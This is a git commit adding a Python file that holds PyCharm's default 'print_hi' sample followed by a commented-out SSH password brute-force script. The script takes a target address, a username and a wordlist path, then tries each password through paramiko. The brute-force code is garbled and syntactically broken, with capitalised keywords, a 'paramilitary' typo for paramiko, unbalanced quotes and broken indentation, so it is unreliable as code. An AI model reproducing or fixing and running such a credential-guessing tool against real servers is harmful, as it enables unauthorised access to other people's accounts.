2e41ae6926abea97cc4a8a4baa387c6d260c414a
kelvinekisa <kelvinekisa8@gmail.com>
2022-04-13 11:18:45 +0300

    1st Commit

---
+++ main.py
@@ -0,0 +1,53 @@
+# This is a sample Python script.
+
+# Press Shift+F10 to execute it or replace it with your code.
+# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
+
+
+def print_hi(name):
+    # Use a breakpoint in the code line below to debug your script.
+    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+
+
+# Press the green button in the gutter to run the script.
+if __name__ == '__main__':
+    print_hi('PyCharm')
+#
+# # See PyCharm help at https://www.jetbrains.com/help/pycharm/
+# from _ast import Import
+#
+# import paramiko as paramiko
+#
+# Import paramiko,sys,is,socket,termcolor
+#
+# def ssh_ connect(password,code=0):
+#        ssh=paramiko.SSHClient()
+# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+# try:
+#      ssh.connect(host,port =22,username=username,password=password)
+# Except paramilitary.AuthenticateException:
+#      Code=1
+# ssh.close()
+# return code
+#
+# host = input('[+] Enter your target address)
+# Username = input([+] Enter the ssh username of the target)
+# Input_file = input([+] Enter the password file path)
+# Print('\n')
+#
+# If OS.path.exists(input_file,'r')as file:
+#  For line out file.readlines()
+#    Password = line.strip()
+#     try:
+#           response = ssh_connect(password)
+#         If response= =0:
+#               Print(termcolor.coloured('[+] found password: + ' ,'for account:'+ username),green))
+# Break
+# elif response==1:
+#    Print('[-] incorrect login:+ password)
+# elif response==2:
+#    Print('[!!!] Can't connect')
+# Sys.exit(1)
+# except Exception as e:
+#     Print('e')
+# Pass
